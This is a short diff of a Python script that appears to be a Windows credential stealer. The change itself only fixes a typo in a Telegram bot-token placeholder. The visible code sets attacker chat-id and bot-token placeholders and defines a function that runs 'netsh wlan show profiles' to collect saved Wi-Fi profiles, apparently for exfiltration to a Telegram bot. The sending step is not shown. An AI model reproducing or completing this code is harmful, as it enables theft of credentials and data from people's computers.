@@ -5,7 +5,7 @@ import time, socket , pyautogui ,requests , os, subprocess
 
 if os.name == "nt":
     chat_id = ">>>>>CHAT-İD>>>>>>>>"
-    Bot_Token = "<<<<<<<BOT-TOKE<<<<<<<"
+    Bot_Token = "<<<<<<<BOT-TOKEN<<<<<<<"
 
     def internetinfo():
         output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
